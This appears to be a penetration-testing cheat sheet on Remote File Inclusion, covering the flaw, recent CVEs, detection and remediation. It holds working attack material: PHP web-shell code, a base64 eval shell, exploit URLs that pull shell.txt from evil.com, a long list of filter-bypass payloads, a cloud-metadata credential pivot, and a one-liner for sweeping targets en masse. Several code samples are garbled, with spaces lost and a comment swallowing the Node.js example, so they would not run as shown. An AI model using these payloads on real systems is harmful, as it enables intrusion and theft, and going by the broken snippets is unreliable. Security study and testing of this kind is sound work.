---
title: Remote File Inclusion (RFI)
---

# Remote File Inclusion (RFI)

**Remote File Inclusion (RFI)** is a web vulnerability that happens when a web application lets users include files from external (remote) servers without proper validation. It usually affects PHP apps where user input is passed directly into functions like `include()` or `require()`.

## Fundamentals of RFI

RFI exploits applications that dynamically include files based on user input **and allow remote URLs to be included as executable code**.

RFI happens when an application lets users decide **which file to load** and mistakenly trusts that the file will always be local and safe. The core issue isn’t just that the input contains a URL. **it’s that remote input reaches `include()` or `require()` without filtering**, and PHP is configured to allow remote includes.

When a file is *remotely included*, the server **fetches the content from a remote server** and executes it as part of the program. This is not a data fetch, or file read, its full **server-side execution of remote attacker-controlled code**, often resulting in **immediate RCE**.

Traversal is usually **not needed** here. The attacker doesn’t escape directories. they just inject a URL pointing to their own payload.

**Normal flow:**

```php
include("pages/" .$_GET['page']);// page=home.php → safe local include
```

**RFI conversion:**

```
?page=http://evil.com/shell.txt  → executes attacker’s remote file as PHP
?page=data://text/plain;base64,... → executes inlinebase64 PHP shell
```

**The result**: external code becomes part of the app’s logic, executed with the server’s full privileges. This makes RFI one of the most dangerous inclusion flaws.

| Vulnerability | Target | Mechanism | Primary Impact |
| --- | --- | --- | --- |
| **Path Traversal (CWE-22)** | Filesystem paths | `"../"` to read files | **File disclosure only** [OWASP](https://owasp.org/www-community/attacks/Path_Traversal) |
| **LFI (CWE-98)** | Local `include()` paths | Traversal + server-side inclusion | **File read + RCE** (logs, wrappers) |
| **RFI (CWE-98)** | Remote URL input | Remote `include()` via user input | **Remote Code Execution (RCE)** |
| **SSRF (CWE-918)** | Internal services | Server-side HTTP requests | Access internal network or metadata |

**Key :**

***RFI = execute remote attacker code.***

***LFI = include local file, possibly execute.***

***Traversal = read-only primitive.***

***SSRF = network-only access, no file execution.***

## Attack Surfaces

RFI surfaces wherever user input decides which file gets included, and the runtime is configured to permit remote resources. Common locations include:

- `page`, `file`, `view`, `template`, `include`, `module`, `lang`, `config` parameters in legacy PHP MVC routing
- CMS plugin/theme loaders that build include paths from request parameters (WordPress, Joomla)
- Custom template engines that fetch a "theme" or "skin" file by name from user input
- Language/localization selectors (`?lang=en.php`) that map directly to a file path
- Any endpoint accepting a URL, then passing it to `include()`, `require()`, `file_get_contents()`, or a template-rendering function without validating the scheme
- Any environment where `allow_url_include = On` - check via `phpinfo()` disclosure, error messages, or blind testing, since this setting is the hard prerequisite for classic RFI

## RFI Attack Types

**1. Classic RFI (HTTP include):**

Include a file hosted on attacker’s server:  `?page=http://evil.com/shell.txt`

**2. Wrapper-based RFI:**

Use PHP stream wrappers for payload injection: `?page=data://text/plain;base64,PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pOz8+
?page=php://input`

**3. Chained RFI:**

Used after SSRF, file upload, or misconfigured file handling to chain into execution.

## Recent RFI CVEs (2023–2025)

| CVE | Year | Component | Type | Impact |
| --- | --- | --- | --- | --- |
| **CVE-2024-5577** | 2024 | WP *Where I Was...* Plugin | Unauth RFI | Remote include + RCE (requires `allow_url_include`) |
| **CVE-2024-4498** | 2024 | Lollms WebUI | Path traversal → RFI | Remote PHP code execution |
| **CVE-2023-2551** | 2023 | Bumsys App | Authenticated RFI | PHP file from remote server executes |
| **CVE-2023-3452** | 2023 | Canto WP Plugin | Unauth RFI | Unrestricted include leads to RCE |

## 1. Classic RFI (HTTP Include)

Classic Remote File Inclusion happens when a PHP application directly includes a **remote URL** controlled by an attacker. If `allow_url_include = On` (and often `allow_url_fopen = On`), PHP treats the remote content like local code and **executes it as part of the app**.

This is the most straightforward form of RFI: supply a `http://` or `https://` link as input, and the server fetches and runs the code inside.

---

### Code Example

```php
<?phpinclude($_GET['page']);// vulnerable?>
```

**Attacker input:**

```
?page=http://evil.com/shell.txt
```

**Contents of `shell.txt` on attacker’s server:**

```php
<?phpsystem($_GET['cmd']);?>
```

**Final exploit URL:**

```
http://vulnerable.site/index.php?page=http://evil.com/shell.txt&cmd=id
```

This gives RCE. The attacker can run system commands like `id`, `uname -a`, `cat /etc/passwd`, etc.

### Bypass Techniques

---

| Bypass | Payload | Notes |
| --- | --- | --- |
| **URL encoding** | `%68%74%74%70%3a%2f%2fevil.com%2fshell.txt` | Obfuscates `http://` |
| **Double encoding** | `%25%36%38%25%37%34...` | Bypasses naive filters |
| **Path normalization** | `///evil.com/shell.txt` | Some servers normalize leading slashes into `http://` |
| **Null byte (older PHP)** | `http://evil.com/shell.txt%00` | Truncation attack (pre-PHP 5.3.4) |
| **Alternate protocols** | `ftp://`, `gopher://`, `data://` | Some wrappers also support remote includes |
| **Fake extensions** | `shell.txt%00.php` or `shell.txt.jpg` | Bypasses extension |

## 2. "Wrapper-Based RFI" – JavaScript Context

Wrapper-based RFI happens when attacker-controlled **data** or **encoded payloads** are injected into a dynamic execution sink like `eval()`, `Function()`, or `vm.runInContext()`. There’s no native `data://`, but **`data:` URIs**, `atob()`, and string-based execution mimic the same behavior.

---

### Code Example (Node.js)

```jsx
const http =require('http');const vm =require('vm');

http.createServer((req, res) => {let url =newURL(req.url,`http://${req.headers.host}`);let script = url.searchParams.get("script");// can be base64 or data: URIif (script.startsWith("data:text/javascript;base64,")) {const base64Payload = script.split(',')[1];const decoded =Buffer.from(base64Payload,'base64').toString();

    vm.runInNewContext(decoded);// vulnerable
    res.end('Wrapper-based JS executed');
  }else {
    res.end('Invalid input');
  }
}).listen(8080);
```

### Payload (Base64 wrapper)

**Exploit URL:**

```
http://vulnerable.site:8080/?script=data:text/javascript;base64,Y29uc29sZS5sb2coIlJGSSBieXBhc3MiKQ==
```

**Decoded JS:**

```jsx
console.log("RFI bypass")
```

Executes arbitrary code from a **base64-encoded script** inside a data URI — this mirrors PHP’s `data://` wrapper.

### Similar Wrappers / Tricks

| JS Equivalent | Payload | Description |
| --- | --- | --- |
| **`data:` URI** | `data:text/javascript;base64,...` | Executes inline code, often in browser or dynamic JS loaders |
| **stdin** | Read from `process.stdin` and `eval()` | Mirrors `php://input` |
| **File Descriptor** | `fs.readFileSync('/proc/self/fd/0')` | Reads active input stream (rare but possible) |
| **Buffer decoding** | `eval(Buffer(...))` | Used for encoded payload delivery |
| **`vm.runInThisContext`** | Dynamic execution like PHP `eval(include(...))` | Full server-side RCE potential |

## 3. **Chained RFI**

**Chained RFI** refers to leveraging RFI *after* another vulnerability like **SSRF**, **file upload**, or **path traversal** to trigger **remote code execution (RCE)**. On its own, RFI may be blocked by config or filters. But when combined with other bugs, it becomes viable again.

It’s not just about sending a `?page=http://evil.com/shell.` it’s about **setting up the environment** so that remote execution becomes possible through chained primitives.

### Common Chains

| Chain | How it Works | Goal |
| --- | --- | --- |
| **SSRF → RFI** | SSRF targets a local service that includes a user-supplied URL | Remote execution via internal include |
| **File Upload → RFI** | Upload a malicious file, then include it via remote path or internal proxy | Turn file upload into RCE |
| **Path Traversal → RFI** | Use traversal to overwrite or point `include()` to remote-wrapped resource | Combine read/write + RFI sink |
| **LFI → RFI-Style Wrapper** | LFI hits `php://input` or `data://` with attacker payload | Bypass local-only logic by feeding remote-style input |
| **Template Injection → RFI** | SSTI enables file inclusion or `require()` on attacker-controlled path | Dynamic execution of attacker’s template |

## Exploitation and Bypassing Defenses

Basic RFI just means submitting `http://attacker.com/shell.txt` - but almost every real target has some filtering in place. Escalating past that filtering uses standard encoding/obfuscation tricks:

```jsx
# Case manipulation — some filters are case-sensitive on the scheme
?page=HTTP://evil.com/shell.txt
?page=HtTp://evil.com/shell.txt

# URL-encoding the scheme to dodge a literal string match on "http://"
?page=%68%74%74%70%3a%2f%2fevil.com%2fshell.txt

# Double URL-encoding — defeats filters that only decode once
?page=%2568%2574%2574%2570%253a%252f%252fevil.com%252fshell.txt

# Appending a null byte or query string to defeat extension allowlisting (legacy PHP < 5.3.4 for null byte)
?page=http://evil.com/shell.txt%00
?page=http://evil.com/shell.txt?

# Appending a fake "safe" extension so a naive filter sees .php or .jpg and allows it, while PHP itself still fetches and executes the underlying content
?page=http://evil.com/shell.txt%00.php
?page=http://evil.com/shell.php%23.jpg   # # (URL fragment) truncates for the remote server, PHP still gets shell.php

# IP-address obfuscation of the attacker's own host, to dodge domain-based blocklists
?page=http://2130706433/shell.txt        # decimal form of 127.0.0.1 — swap for attacker's real decimal IP
?page=http://0x7f000001/shell.txt        # hex form
?page=http://[::ffff:7f00:1]/shell.txt   # IPv6-mapped form

# Protocol/wrapper substitution when http/https are blocked but other wrappers aren't
?page=ftp://evil.com/shell.txt
?page=\\evil.com\shell.txt               # Windows/SMB-style UNC path, works against some misconfigured include logic

# Bypassing a "must start with http" regex by embedding a second scheme after a decoy
?page=http://trusted.com@evil.com/shell.txt   # userinfo trick — validator sees "http://trusted.com", browser/PHP fetches evil.com
```

## Advanced Attack Scenarios

#### 1. RFI via SSRF-restricted internal include

Some apps block direct `http://` input but internally proxy a "fetch resource" feature that itself calls `include()` on the result. If you can get that internal fetch to reach an attacker-controlled server (even through an SSRF filter bypass - DNS rebinding, redirect chaining, decimal IP), you achieve RFI indirectly through a component that was only ever tested for SSRF, not RFI.

#### 2. File upload + RFI-style remote fetch chaining

If the app has a separate "import from URL" feature (e.g., "add profile picture from URL," "import document from link") that internally calls a file-inclusion or template-rendering function on the fetched result rather than just storing it as a static asset, this becomes RFI wearing an upload feature's clothing. Test any "import from URL" feature by pointing it at your `shell.txt` and checking if the response reflects code execution rather than just a stored image/file.

#### 3. Cloud metadata pivot when RFI is blocked but SSRF-like fetching remains

If `allow_url_include` is off (blocking true RFI) but the app still fetches attacker-supplied URLs server-side for any other reason (preview generation, webhook validation, PDF rendering), pivot the "dead" RFI attempt into an SSRF read against `http://169.254.169.254/latest/meta-data/` - the include primitive may be dead, but the underlying "fetch attacker URL" capability often isn't, and cloud credential theft is frequently higher severity than the original RFI would have been.

#### 4. Second-order RFI via stored parameters

If a vulnerable `page` parameter's value gets saved (user preferences, saved search, saved report config) rather than used immediately, submit your payload once, then trigger the stored value's use later, possibly from a different, higher-privileged context (e.g., an admin viewing a "shared report" that stores the malicious `page` value). This turns a single-request RFI into a stored attack against a different victim.

## Detection Techniques

### Manual

```jsx
# Step 1 — identify candidate parameters (see Attack Surfaces list above)
# Step 2 — confirm the app fetches remote content at all, using an out-of-band listener
# instead of jumping straight to a PHP shell payload — this proves the sink is live without needing execution to already work
?page=http://YOUR-COLLABORATOR-ID.oastify.com/

# A DNS or HTTP hit on your Burp Collaborator / interactsh listener confirms the app is making an outbound request based on your input — the core RFI precondition

# Step 3 — once confirmed, escalate to an actual PHP payload hosted on a server you control
?page=http://your-vps-ip/shell.txt&cmd=id

# Check whether allow_url_include is even plausible before spending time testing (look for phpinfo() disclosure, verbose error pages, or version fingerprinting)
curl -s https://target.com/phpinfo.php | grep -i "allow_url_include"
curl -s https://target.com/ | grep -i "PHP/"   # older PHP versions are far likelier to have this on
```

### Automated

```jsx
# ffuf — fuzz common RFI-prone parameters across many endpoints at once
ffuf -u "https://target.com/index.php?page=FUZZ" \
  -w rfi-payloads.txt -mr "RFI-TEST-STRING"

# nuclei — dedicated RFI detection templates
nuclei -u https://target.com -t http/vulnerabilities/generic/generic-rfi.yaml

# Katana + qsreplace, chained the same way as the LFI one-liner, but pointed at an out-of-band collaborator URL instead of a local file, for mass endpoint sweeping
echo "https://target.com" | katana -d 3 -silent | grep "=" \
  | qsreplace "http://YOUR-COLLABORATOR-ID.oastify.com/" \
  | xargs -I{} sh -c 'curl -s "{}" > /dev/null'
# then check your Collaborator/interactsh dashboard for hits, and cross-reference which URL in your katana output corresponds to each hit
```

## Common vulnerabilities RFI-Parameters:

```jsx
?page=
?p=
?file=
?filename=
?filepath=
?doc=
?document=
?template=
?tpl=
?view=
?layout=
?load=
?module=
?mod=
?component=
?content=
?include=
?inc=
?lang=
?locale=
?theme=
?skin=
?url=
?u=
?script=
?callback=
?handler=
?config=
?controller=
?action=
```

## Tools

|                      **Tool** |                   **Purpose** |
| --- | --- |
| Burp Suite | Manual payload tampering and out-of-band RFI confirmation |
| ffuf | Parameter fuzzing across many candidate include points |
| Nuclei | Templated automated RFI detection at scale |
| Katana | Crawl and extract parameterized endpoints for RFI sweeping |
| interactsh | Free, self-hostable out-of-band interaction server for blind RFI confirmation |
| fimap | Automated LFI/RFI discovery and exploitation |
| PayloadsAllTheThings | Curated payload/bypass reference |

## **Impact**:

- **Remote Code Execution (RCE)** via `http://evil.com/shell.txt`
- **Execution of attacker-hosted scripts** using `include($_GET['page'])`
- **Bypass of input validation** using encoded payloads (`%68%74%74%70...`)
- **Full server compromise** through persistent web shells
- **Credential and config file theft** via remote PHP payloads
- **Privilege escalation** through remote inclusion of sensitive logic
- **SSRF → RFI chaining** for internal service abuse
- **RFI → Webshell drop** for persistent access
- **Data exfiltration** by executing exfil logic in remote file
- **Evading path-based filters** using `data://` or proxy redirects

## Remediations

- Disable `allow_url_include` and `allow_url_fopen`
- Never include files based on user input
- Use allowlists for file names
- Block dangerous input like `://`, `http`, `data:`, `..`
- Use `realpath()` to restrict include paths
- Disallow PHP wrappers (`data://`, `php://`, etc.)
- Keep uploaded files isolated from includes
- Regularly update plugins, themes, and PHP code

## Good To Read

[https://hackerone.com/reports/192940](https://hackerone.com/reports/192940)

[https://hackerone.com/reports/14092](https://hackerone.com/reports/14092)

[https://www.akamai.com/blog/security/criminals-using-targeted-remote-file-inclusion-attacks-in-phishing-campaigns](https://www.akamai.com/blog/security/criminals-using-targeted-remote-file-inclusion-attacks-in-phishing-campaigns)

## References

1. [https://owasp.org/www-community/attacks/Remote_File_Inclusion](https://owasp.org/www-community/attacks/Remote_File_Inclusion)
2. [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md)
3. [https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/](https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/)
4. [https://www.imperva.com/learn/application-security/file-inclusion/](https://www.imperva.com/learn/application-security/file-inclusion/)
5. [https://www.invicti.com/learn/remote-file-inclusion-rfi/](https://www.invicti.com/learn/remote-file-inclusion-rfi/)
6. [https://portswigger.net/web-security/file-path-traversal](https://portswigger.net/web-security/file-path-traversal)